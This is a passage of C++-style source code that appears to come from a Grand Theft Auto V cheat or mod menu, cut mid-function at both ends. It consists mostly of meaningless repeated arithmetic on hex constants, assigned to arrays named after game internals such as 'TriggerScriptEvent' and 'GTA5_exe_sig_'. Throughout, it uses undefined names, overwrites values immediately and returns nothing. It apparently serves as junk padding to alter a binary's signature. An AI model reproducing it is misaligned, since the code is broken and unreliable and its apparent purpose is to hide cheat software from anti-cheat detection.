			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		}
		int GetScreenY()
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
